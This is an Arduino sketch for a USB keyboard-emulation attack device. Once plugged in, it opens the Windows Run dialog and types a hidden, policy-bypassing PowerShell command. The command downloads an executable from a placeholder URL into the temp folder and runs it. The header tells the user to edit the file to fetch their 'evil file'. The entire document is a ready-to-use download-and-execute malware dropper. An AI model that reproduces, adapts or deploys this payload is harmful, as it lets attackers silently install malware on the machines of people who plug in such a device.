/*
 * Orignial Script By Mubix
 * Converted By Darren Rainey
 * Note you need to edit this file to
 * Download your evil file
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/file.exe',\\\"$env:temp\\file.exe\\\"); Start-Process \\\"$env:temp\\file.exe\\\"\"");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}